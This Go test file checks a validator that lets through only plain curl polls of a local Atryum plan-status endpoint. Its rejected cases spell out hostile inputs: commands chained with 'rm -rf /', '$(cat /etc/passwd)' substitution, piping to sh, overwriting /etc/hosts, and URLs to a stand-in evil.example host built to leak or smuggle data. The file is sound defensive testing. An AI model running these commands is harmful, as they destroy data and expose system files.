package invocation

import "testing"

func TestPlanStatusFastPass(t *testing.T) {
	const planID = "plan_2b1c9f8e-8b1f-4c2a-9f6d-1a2b3c4d5e6f"
	const pollURL = "http://localhost:8080/api/v1/external/plans/" + planID
	const pollCurl = `curl -fsS -H "Authorization: Bearer $ATRYUM_ACCESS_TOKEN" ` + pollURL

	tests := []struct {
		name  string
		input map[string]any
		want  bool
	}{
		{"plain curl poll", map[string]any{"cmd": pollCurl}, true},
		{"curl poll piped to jq", map[string]any{"cmd": pollCurl + " | jq .status"}, true},
		{"quoted url", map[string]any{"cmd": `curl -fsS "` + pollURL + `"`}, true},
		{"flags after url", map[string]any{"cmd": "curl " + pollURL + " --max-time 10 -sS"}, true},
		{"bare url with GET method", map[string]any{"url": pollURL, "method": "GET"}, true},
		{"poll with inert description", map[string]any{"command": pollCurl, "description": "Poll Atryum plan status"}, true},
		{"poll with timeout number", map[string]any{"command": pollCurl, "timeout": float64(30000)}, true},
		{"argv shell wrapper", map[string]any{"command": []any{"bash", "-lc", pollCurl}}, true},
		{"argv curl", map[string]any{"command": []any{"curl", "-fsS", pollURL}}, true},

		{"empty input", map[string]any{}, false},
		{"empty plan id", map[string]any{"cmd": pollCurl}, false},
		{"poll chained with second command", map[string]any{"cmd": pollCurl + " && rm -rf /"}, false},
		{"poll then semicolon payload", map[string]any{"cmd": pollCurl + "; touch /tmp/pwned"}, false},
		{"command substitution in header", map[string]any{"cmd": `curl -H "X: $(cat /etc/passwd)" ` + pollURL}, false},
		{"backtick substitution", map[string]any{"cmd": "curl `id` " + pollURL}, false},
		{"pipe to non-jq", map[string]any{"cmd": pollCurl + " | sh"}, false},
		{"jq filter with substitution", map[string]any{"cmd": pollCurl + " | jq $(id)"}, false},
		{"explicit method override", map[string]any{"cmd": "curl -X POST " + pollURL}, false},
		{"combined method override", map[string]any{"cmd": "curl -XPOST " + pollURL}, false},
		{"data flag", map[string]any{"cmd": "curl -d '{}' " + pollURL}, false},
		{"output written to file", map[string]any{"cmd": "curl -o /etc/hosts " + pollURL}, false},
		{"cancel path", map[string]any{"cmd": "curl " + pollURL + "/cancel"}, false},
		{"different plan id", map[string]any{"cmd": "curl http://localhost:8080/api/v1/external/plans/plan_other"}, false},
		{"userinfo smuggled host", map[string]any{"cmd": "curl http://evil.example/api/v1/external/plans/" + planID + "@evil.example/x"}, false},
		{"query string", map[string]any{"cmd": "curl " + pollURL + "?x=1"}, false},
		{"bare POST method", map[string]any{"url": pollURL, "method": "POST"}, false},
		{"poll only mentioned in description", map[string]any{"command": "rm -rf /", "description": pollCurl}, false},
		{"payload in unknown extra field", map[string]any{"cmd": pollCurl, "post_hook": "rm -rf /"}, false},
		{"nested structure", map[string]any{"cmd": pollCurl, "extra": map[string]any{"cmd": "rm -rf /"}}, false},
		{"non-string argv element", map[string]any{"command": []any{"curl", float64(1)}}, false},
		{"poll substring inside larger url", map[string]any{"cmd": "curl http://evil.example/steal?u=" + pollURL}, false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			id := planID
			if tt.name == "empty plan id" {
				id = ""
			}
			if got := planStatusFastPass(id, tt.input); got != tt.want {
				t.Errorf("planStatusFastPass(%q, %v) = %v, want %v", id, tt.input, got, tt.want)
			}
		})
	}
}
